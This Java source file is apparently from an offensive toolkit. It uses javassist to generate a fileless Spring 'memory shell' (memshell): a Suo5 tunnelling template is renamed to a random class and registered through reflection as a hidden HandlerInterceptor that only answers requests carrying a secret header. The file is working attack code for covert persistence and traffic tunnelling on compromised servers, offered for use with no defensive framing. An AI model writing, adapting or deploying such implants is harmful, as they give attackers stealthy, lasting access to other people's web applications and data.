package com.mechoy.memshell.suo5;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class Suo5SpringInterceptorProxy {
    public static byte[] generateListenerMemShell(String path, String headerKey, String headerValue) throws CannotCompileException, NotFoundException, IOException {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.mechoy.memshell.suo5.template.Suo5Template");

        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");
        String className = "A" + replace;

        // 修改类名和包名
        ctClass.setName(className);

        // 实现接口
        CtClass handlerInterceptor = pool.get("org.springframework.web.servlet.HandlerInterceptor");
        ctClass.setInterfaces(new CtClass[]{handlerInterceptor});


        // 创建preHandle方法
        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, java.lang.Object handler) throws java.lang.Exception {\n" +
                "        String agent = request.getHeader(\"" + headerKey + "\");\n" +
                "        String contentType = request.getHeader(\"Content-Type\");\n" +
                "        if (agent == null || !agent.contains(\"" + headerValue + "\")) {\n" +
                "            return true;}\n" +
                "        if (contentType == null) {\n" +
                "            return true;\n" +
                "        }\n" +
                "        try {\n" +
                "            if (contentType.equals(\"application/plain\")) {\n" +
                "                tryFullDuplex(request, response);\n" +
                "                return false;\n" +
                "            }\n" +
                "            if (contentType.equals(\"application/octet-stream\")) {\n" +
                "                processDataBio(request, response);\n" +
                "            } else {\n" +
                "                processDataUnary(request, response);\n" +
                "            }\n" +
                "        } catch (Throwable e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "        return false;\n" +
                "    }", ctClass);
        ctClass.addMethod(preHandle);

        // 创建静态代码块，用于实现注入内存马
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "   org.springframework.web.context.WebApplicationContext webApplicationContext = (org.springframework.web.context.WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
                "   org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
                "   java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "   adaptedInterceptorsField.setAccessible(true);\n" +
                "   java.util.List adaptedInterceptors =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "   adaptedInterceptors.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
                "   adaptedInterceptorsField.set(abstractHandlerMapping,adaptedInterceptors);\n" +
                "   org.springframework.web.servlet.handler.AbstractHandlerMapping simpleUrlHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"resourceHandlerMapping\");\n" +
                "   java.util.List adaptedInterceptors1 =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "   adaptedInterceptors1.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
                "   adaptedInterceptorsField.set(simpleUrlHandlerMapping,adaptedInterceptors1);" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}");

        return ctClass.toBytecode();
    }
}
